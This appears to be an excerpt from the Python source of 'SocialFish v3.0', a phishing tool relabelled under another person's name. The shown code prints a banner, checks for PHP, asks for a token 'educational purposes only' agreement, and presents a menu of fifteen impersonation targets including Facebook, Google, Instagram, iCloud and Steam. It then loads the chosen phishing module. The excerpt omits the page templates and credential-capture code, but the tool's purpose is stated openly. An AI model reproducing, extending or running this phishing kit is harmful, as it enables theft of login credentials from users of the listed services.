...
[ {0} WELCOME TO SOCIALFISH V3.0  by-AbhishekChougule]\n {1}'''.format(GREEN, DEFAULT, CYAN))
...
def runPEnv(): #menu where user select what they wanna use
    system('clear')
    print ('''           {2}-{1} AbhishekChougule {2}|{1} AbhishekChougule {2}|{1} AbhishekChougule {2}- INDIA
                       .   .  .
                 .  '  .        '                        '
             '             '      '                   '   '
  ███████ ████████ ███████ ██ ███████ ██       ███████ ██ ███████ ██   ██
  ...
  ███████ ████████ ███████ ██ ██   ██ ███████  ██      ██ ███████ ██   ██
      .    '   '....'               ..'.      ' .
         '  .                     .     '          '     '  {1}v3.0{2}
               '  .  .  .  .  . '.    .'              '  .
                   '         '    '. '  {1}Updated_By--> AbhishekChougule{2}
 ...
 _________________________________________________________________________________
    ...
    if 256 != system('which php'): #Checking if user have PHP
        ...
        exit(0)
    if input(" {0}[{1}!{0}]{1} Do you agree to use this tool for educational purposes only? (y/n)\n {2}SF-AbhishekChougule > {1}".format(RED, DEFAULT, CYAN)).upper() != 'Y': #Question where user must accept education purposes
        system('clear')
        ...
        exit(0)
    option = input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With   AbhishekChougule !\n\n {0}SF-AbhishekChougule >  {1}".format(CYAN, DEFAULT))
    if option == '1':
        loadModule('Facebook')
